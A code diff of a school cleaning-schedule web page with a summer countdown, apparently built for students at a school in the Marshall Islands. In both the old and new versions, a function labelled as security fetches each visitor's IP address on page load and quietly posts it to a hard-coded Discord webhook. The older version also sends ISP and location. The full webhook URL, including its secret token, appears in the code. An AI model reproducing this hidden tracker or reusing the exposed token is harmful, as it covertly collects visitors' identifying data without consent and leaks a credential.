@@ -32,20 +32,6 @@
         .countdown-gradient {
             background: linear-gradient(135deg, #1e293b 0%, #334155 100%);
         }
-        /* Lock screen for out of region */
-        #geoLock {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: rgba(255,255,255,0.9);
-            backdrop-filter: blur(10px);
-            z-index: 9999;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            padding: 2rem;
-        }
-        /* Summer Break Overlay */
         #summerOverlay {
             display: none;
             position: fixed;
@@ -60,8 +46,6 @@
             background-color: #3b82f6;
             color: white;
         }
-
-        /* Privacy Blur Logic */
         .privacy-box {
             transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
             cursor: help;
@@ -70,44 +54,32 @@
             filter: blur(6px);
             transition: filter 0.3s ease;
         }
-        .privacy-box:hover .blur-text, 
-        .privacy-box:active .blur-text {
+        .privacy-box:hover .blur-text {
             filter: blur(0);
         }
     </style>
 </head>
 <body class="p-4 md:p-8">
-    <!-- Location Lock Screen -->
-    <div id="geoLock">
-        <div class="max-w-md p-8 bg-white rounded-3xl shadow-2xl border border-red-100">
-            <div class="text-5xl mb-4 text-red-500">📍</div>
-            <h2 class="text-2xl font-bold text-slate-800 mb-2">Access Restricted</h2>
-            <p class="text-slate-600">This cleaning schedule is only available for students currently in Majuro Cooperative School, Marshall Islands.</p>
-        </div>
-    </div>
 
-    <!-- Summer Break Finish Screen -->
     <div id="summerOverlay">
         <div class="p-8">
             <h1 class="text-6xl md:text-9xl mb-6">🏝️</h1>
             <h2 class="text-4xl md:text-6xl font-black text-amber-900 mb-4 italic uppercase">The time is up!</h2>
             <p class="text-2xl md:text-4xl font-bold text-amber-800 uppercase tracking-widest">Summer is here!</p>
-            <p class="mt-8 text-amber-700 font-medium">Cleaning duties are officially over for the school year. This system is officially down forever.</p>
+            <p class="mt-8 text-amber-700 font-medium">Cleaning duties are officially over.</p>
         </div>
     </div>
 
     <div class="max-w-6xl mx-auto" id="mainContent">
-        <!-- Menu Navigation -->
         <div class="flex flex-col md:flex-row items-center justify-between mb-8 gap-4">
-            <!-- User Info Display with Privacy Blur -->
-            <div id="userInfo" class="privacy-box bg-white/50 border border-slate-200 px-4 py-2 rounded-xl text-[10px] text-slate-500 font-mono shadow-sm flex flex-col min-w-[220px] relative overflow-hidden group">
-                <div class="absolute inset-0 bg-blue-500/5 opacity-0 group-hover:opacity-100 transition-opacity"></div>
+            <!-- Simplified User Info Display -->
+            <div id="userInfo" class="privacy-box bg-white/80 border border-slate-200 px-4 py-2 rounded-xl text-[10px] text-slate-500 font-mono shadow-sm flex flex-col min-w-[220px] relative overflow-hidden group">
                 <div class="blur-text flex flex-col gap-0.5 relative z-10">
-                    <span id="displayIP" class="font-bold">IP: Fetching...</span>
-                    <span id="displayISP" class="truncate max-w-[200px]">ISP: Fetching...</span>
+                    <span id="displayIP" class="font-bold">IP: Locating...</span>
+                    <span id="displayISP" class="truncate max-w-[200px]">Status: Active</span>
                 </div>
-                <div class="absolute inset-0 flex items-center justify-center opacity-100 group-hover:opacity-0 transition-opacity pointer-events-none">
-                    <span class="text-[9px] uppercase tracking-tighter text-slate-400 font-bold bg-white/80 px-2 py-0.5 rounded shadow-sm">Hover to reveal info</span>
+                <div class="absolute inset-0 flex items-center justify-center opacity-100 group-hover:opacity-0 transition-opacity pointer-events-none bg-white/90">
+                    <span class="text-[9px] uppercase tracking-tighter text-slate-400 font-bold">Hover to reveal info</span>
                 </div>
             </div>
 
@@ -118,7 +90,6 @@
             <div class="w-[220px] hidden md:block"></div>
         </div>
 
-        <!-- Countdown Section -->
         <div id="countdownSection" class="hidden mb-8 countdown-gradient rounded-2xl p-8 text-white shadow-xl text-center border border-slate-700">
             <h2 class="text-sm font-bold uppercase tracking-[0.3em] text-slate-400 mb-6">Countdown to Summer Break</h2>
             <div id="countdownDisplay" class="text-4xl md:text-7xl font-black tracking-tighter flex justify-center gap-4 md:gap-8">
@@ -130,16 +101,8 @@
                 <span class="opacity-30 self-center">:</span>
                 <div class="flex flex-col"><span id="seconds">00</span><span class="text-xs uppercase tracking-widest text-slate-400 mt-2">Sec</span></div>
             </div>
-            <div class="mt-8 pt-6 border-t border-slate-700/50">
-                <div class="inline-flex items-center text-yellow-400 text-lg font-bold">
-                    <svg class="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                    8th Grade Promotion Day: May 29, 2026
-                </div>
-                <p class="text-slate-400 text-sm mt-2 italic">Cleaning ends exactly on this day at 12:00 AM sharp.</p>
-            </div>
         </div>
 
-        <!-- Schedule Section -->
         <div id="scheduleSection">
             <header class="text-center mb-8">
                 <h1 class="text-4xl font-extrabold text-slate-800 tracking-tight">Class Cleaning Schedule</h1>
@@ -155,37 +118,14 @@
                     <p id="currentWeekDisplay" class="text-slate-700 font-bold min-w-[200px] uppercase tracking-wide"></p>
                     <button onclick="changeWeek(1)" class="hover:text-blue-600 font-bold px-2 text-xl transition-colors">&rarr;</button>
                 </div>
-                <p id="weekStatus" class="text-blue-500 text-sm mt-3 font-semibold"></p>
             </header>
 
-            <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-6" id="scheduleGrid">
-                <!-- Day cards injected here -->
-            </div>
-
-            <div class="mt-8 flex justify-center">
-                <div id="breakSection" class="w-full max-w-md">
-                    <!-- Break card injected here -->
-                </div>
-            </div>
-
-            <div class="mt-12 p-6 bg-slate-100 rounded-xl border border-slate-200 text-slate-600">
-                <h4 class="font-bold mb-2 flex items-center">
-                    <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
-                    Rotation Rule:
-                </h4>
-                <ul class="text-sm list-disc ml-8 space-y-1">
-                    <li>Every week, the starting group for Monday shifts by one.</li>
-                    <li>The group that cleaned on Friday last week moves to <b>Break</b> this week.</li>
-                </ul>
-            </div>
+            <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-6" id="scheduleGrid"></div>
+            <div class="mt-8 flex justify-center"><div id="breakSection" class="w-full max-w-md"></div></div>
         </div>
     </div>
 
     <script>
-        /**
-         * Niko | Codes
-         * Developer Watermark - System Integrity and Rotation Management
-         */
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1476862249187545179/Xy23AO6sPJts4PPSB6zTbUSVdqTWIIpCQsmwCNQtk_hqhz-F3eSoCYaC_SMn7xeFQ23W";
 
         const groups = [
@@ -201,216 +141,113 @@
         let weekOffset = 0;
         const summerDate = new Date("May 29, 2026 00:00:00").getTime();
 
-        function showTab(tab) {
-            const countdownSection = document.getElementById('countdownSection');
-            const scheduleSection = document.getElementById('scheduleSection');
-            const countdownBtn = document.getElementById('countdownTabBtn');
-            const scheduleBtn = document.getElementById('scheduleTabBtn');
-
-            if (tab === 'countdown') {
-                countdownSection.classList.remove('hidden');
-                scheduleSection.classList.add('hidden');
-                countdownBtn.classList.add('active');
-                scheduleBtn.classList.remove('active');
-            } else {
-                scheduleSection.classList.remove('hidden');
-                countdownSection.classList.add('hidden');
-                scheduleBtn.classList.add('active');
-                countdownBtn.classList.remove('active');
-            }
-        }
-
-        /**
-         * Security Monitoring Implementation
-         * Updated to use ip-api.com as it handles JSONP requests more reliably in restricted environments.
-         */
-        function initializeSecurityLogging() {
-            // Updated Callback for IP Fetch
-            window.processIdentity = function(res) {
-                if (!res || res.status !== "success") {
-                    console.error("Identity fetch failed or status error.");
-                    return;
-                }
-
-                const ip = res.query || "Private";
-                const isp = res.isp || res.as || "Unknown Provider";
-                const city = res.city || "Unknown";
-                const country = res.country || "Marshall Islands";
-
-                // Update UI Labels
-                document.getElementById('displayIP').textContent = "IP: " + ip;
-                document.getElementById('displayISP').textContent = "ISP: " + isp;
-
-                // Build Discord Webhook Payload
+        function startSecurity() {
+            window.receiveIP = function(data) {
+                const userIP = data.ip || "Unknown";
+                document.getElementById('displayIP').textContent = "IP: " + userIP;
+                
                 const payload = {
-                    content: `🔒 **Cleaning App Access Log**`,
+                    content: "🚨 **System Access Alert**",
                     embeds: [{
-                        title: "System Integrity Check",
-                        description: `User verified from network: \`${ip}\``,
-                        color: 3066993,
-                        fields: [
-                            { name: "Provider", value: isp, inline: true },
-                            { name: "Location", value: `${city}, ${country}`, inline: true }
-                        ],
-                        footer: { text: "Niko | Codes Security" },
-                        timestamp: new Date().toISOString()
+                        description: `User IP: \`${userIP}\`\nTime: ${new Date().toLocaleString()}`,
+                        color: 15158332
                     }]
                 };
 
-                // Multiple transmission strategies
-                try {
-                    // Strategy 1: Standard POST
-                    fetch(WEBHOOK_URL, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(payload)
-                    }).catch(() => {
-                        // Strategy 2: XHR Fallback
-                        const xhr = new XMLHttpRequest();
-                        xhr.open("POST", WEBHOOK_URL);
-                        xhr.setRequestHeader("Content-Type", "application/json");
-                        xhr.send(JSON.stringify(payload));
-                    });
-                } catch (e) {
-                    console.error("Webhook transmission error.");
-                }
+                const xhr = new XMLHttpRequest();
+                xhr.open("POST", WEBHOOK_URL);
+                xhr.setRequestHeader("Content-Type", "application/json");
+                xhr.send(JSON.stringify(payload));
             };
 
-            // Switch to ip-api for better JSONP compatibility
             const script = document.createElement('script');
-            script.src = "https://extreme-ip-lookup.com/json/?callback=processIdentity&key=demo27"; // Using alternate provider for reliability
-            
-            // Backup fetch in case first one fails
-            script.onerror = function() {
-                const altScript = document.createElement('script');
-                altScript.src = "http://ip-api.com/json/?callback=processIdentity";
-                document.head.appendChild(altScript);
-            };
-            
+            script.src = "https://api.ipify.org?format=jsonp&callback=receiveIP";
             document.head.appendChild(script);
         }
 
-        function updateCountdown() {
-            const now = new Date().getTime();
-            const distance = summerDate - now;
+        function showTab(tab) {
+            document.getElementById('countdownSection').classList.toggle('hidden', tab !== 'countdown');
+            document.getElementById('scheduleSection').classList.toggle('hidden', tab !== 'schedule');
+            document.getElementById('countdownTabBtn').classList.toggle('active', tab === 'countdown');
+            document.getElementById('scheduleTabBtn').classList.toggle('active', tab === 'schedule');
+        }
 
+        function updateClock() {
+            const now = new Date();
+            document.getElementById('liveClock').textContent = now.toLocaleTimeString();
+            document.getElementById('liveDate').textContent = now.toLocaleDateString(undefined, { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
+        }
+
+        function updateCountdown() {
+            const distance = summerDate - new Date().getTime();
             if (distance < 0) {
                 document.getElementById("summerOverlay").style.display = "flex";
                 document.getElementById("mainContent").style.display = "none";
                 return;
             }
-
-            const d = Math.floor(distance / (1000 * 60 * 60 * 24));
-            const h = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-            const m = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-            const s = Math.floor((distance % (1000 * 60)) / 1000);
-
-            document.getElementById("days").textContent = String(d).padStart(2, '0');
-            document.getElementById("hours").textContent = String(h).padStart(2, '0');
-            document.getElementById("minutes").textContent = String(m).padStart(2, '0');
-            document.getElementById("seconds").textContent = String(s).padStart(2, '0');
-        }
-
-        function updateClock() {
-            const now = new Date();
-            const timeString = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
-            const dateString = now.toLocaleDateString([], { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
-            
-            document.getElementById('liveClock').textContent = timeString;
-            document.getElementById('liveDate').textContent = dateString;
+            document.getElementById("days").textContent = String(Math.floor(distance / 86400000)).padStart(2, '0');
+            document.getElementById("hours").textContent = String(Math.floor((distance % 86400000) / 3600000)).padStart(2, '0');
+            document.getElementById("minutes").textContent = String(Math.floor((distance % 3600000) / 60000)).padStart(2, '0');
+            document.getElementById("seconds").textContent = String(Math.floor((distance % 60000) / 1000)).padStart(2, '0');
         }
 
         function getWeekNumber(d) {
             d = new Date(Date.UTC(d.getFullYear(), d.getMonth(), d.getDate()));
             d.setUTCDate(d.getUTCDate() + 4 - (d.getUTCDay() || 7));
-            var yearStart = new Date(Date.UTC(d.getUTCFullYear(), 0, 1));
-            return Math.ceil((((d - yearStart) / 86400000) + 1) / 7);
+            return Math.ceil((((d - new Date(Date.UTC(d.getUTCFullYear(), 0, 1))) / 86400000) + 1) / 7);
         }
 
-        function changeWeek(direction) {
-            weekOffset += direction;
-            renderSchedule();
-        }
+        function changeWeek(dir) { weekOffset += dir; renderSchedule(); }
 
         function renderSchedule() {
             const grid = document.getElementById('scheduleGrid');
-            const breakDiv = document.getElementById('breakSection');
-            const now = new Date();
-            
             const targetDate = new Date();
-            targetDate.setDate(now.getDate() + (weekOffset * 7));
+            targetDate.setDate(targetDate.getDate() + (weekOffset * 7));
             
             const weekNum = getWeekNumber(targetDate);
             const startIdx = ((weekNum * 5) + 2) % groups.length;
-            
-            const today = now.getDay(); 
-            const isActualCurrentWeek = (weekOffset === 0);
+            const today = new Date().getDay();
+            const isThisWeek = (weekOffset === 0);
 
-            document.getElementById('currentWeekDisplay').innerText = isActualCurrentWeek 
-                ? "Current Week" 
-                : (weekOffset > 0 ? `+ ${weekOffset} Week(s)` : `- ${Math.abs(weekOffset)} Week(s)`);
-            
-            document.getElementById('weekStatus').innerText = isActualCurrentWeek 
-                ? "Showing current rotation" 
-                : "Schedule Preview";
+            document.getElementById('currentWeekDisplay').innerText = isThisWeek ? "Current Week" : `Offset: ${weekOffset} Week(s)`;
 
             let html = "";
-            let assignedIndices = [];
-
+            let assigned = [];
             for (let i = 0; i < 5; i++) {
-                const groupIdx = (startIdx + i) % groups.length;
-                assignedIndices.push(groupIdx);
-                const group = groups[groupIdx];
-                const isToday = isActualCurrentWeek && (i + 1) === today;
-
+                const idx = (startIdx + i) % groups.length;
+                assigned.push(idx);
+                const isToday = isThisWeek && (i + 1) === today;
                 html += `
-                    <div class="day-card card p-6 ${isToday ? 'today-highlight shadow-lg' : ''}">
-                        <div class="flex justify-between items-center mb-4">
-                            <h3 class="font-bold text-xl ${isToday ? 'text-blue-700' : 'text-slate-800'}">${days[i]}</h3>
-                            ${isToday ? '<span class="text-[10px] bg-blue-600 text-white px-2 py-1 rounded font-black tracking-wider uppercase">Today</span>' : ''}
+                    <div class="day-card card p-6 ${isToday ? 'today-highlight' : ''}">
+                        <div class="flex justify-between items-center mb-2">
+                            <h3 class="font-bold text-lg">${days[i]}</h3>
+                            ${isToday ? '<span class="bg-blue-600 text-[8px] text-white px-1.5 py-0.5 rounded font-black">TODAY</span>' : ''}
                         </div>
-                        <div class="mb-4">
-                            <span class="text-xs font-bold text-slate-400 uppercase tracking-widest">Team</span>
-                            <p class="text-lg font-bold text-slate-700 mt-1">${group.name}</p>
-                        </div>
-                        <ul class="space-y-1">
-                            ${group.members.map(m => `
-                                <li class="text-sm text-slate-600 flex items-center">
-                                    <div class="w-1.5 h-1.5 rounded-full bg-blue-400 mr-2"></div>
-                                    ${m}
-                                </li>
-                            `).join('')}
+                        <p class="text-blue-600 font-bold text-sm mb-3">${groups[idx].name}</p>
+                        <ul class="text-xs text-slate-500 space-y-1">
+                            ${groups[idx].members.map(m => `<li>• ${m}</li>`).join('')}
                         </ul>
-                    </div>
-                `;
+                    </div>`;
             }
             grid.innerHTML = html;
-
-            let breakGroup;
-            for(let i=0; i < groups.length; i++) {
-                if(!assignedIndices.includes(i)) {
-                    breakGroup = groups[i];
-                    break;
-                }
-            }
-
-            breakDiv.innerHTML = `
-                <div class="card break-card p-6 text-center border-slate-300">
-                    <span class="text-xs font-black text-slate-400 uppercase tracking-[0.2em]">Off Duty / Break</span>
-                    <h3 class="text-2xl font-bold text-slate-400 mt-2">${breakGroup.name}</h3>
-                    <p class="text-sm text-slate-500 mt-2 italic">This group is on break this week.</p>
-                    <div class="mt-4 flex flex-wrap justify-center gap-2">
-                        ${breakGroup.members.map(m => `<span class="bg-slate-200 text-slate-600 px-3 py-1 rounded-full text-xs">${m}</span>`).join('')}
+            
+            const bIdx = groups.findIndex((_, i) => !assigned.includes(i));
+            const breakGroup = groups[bIdx];
+            
+            document.getElementById('breakSection').innerHTML = `
+                <div class="card break-card p-6 text-center">
+                    <span class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">On Break</span>
+                    <h3 class="text-xl font-bold text-slate-500 mb-3">${breakGroup.name}</h3>
+                    <div class="flex flex-wrap justify-center gap-2">
+                        ${breakGroup.members.map(m => `<span class="bg-slate-200 text-slate-500 px-3 py-1 rounded-full text-[10px] font-medium">• ${m}</span>`).join('')}
                     </div>
-                </div>
-            `;
+                </div>`;
         }
 
         window.onload = () => {
-            initializeSecurityLogging();
+            startSecurity();
             renderSchedule();
             updateClock();
-            updateCountdown();
             setInterval(updateClock, 1000);
             setInterval(updateCountdown, 1000);
         };
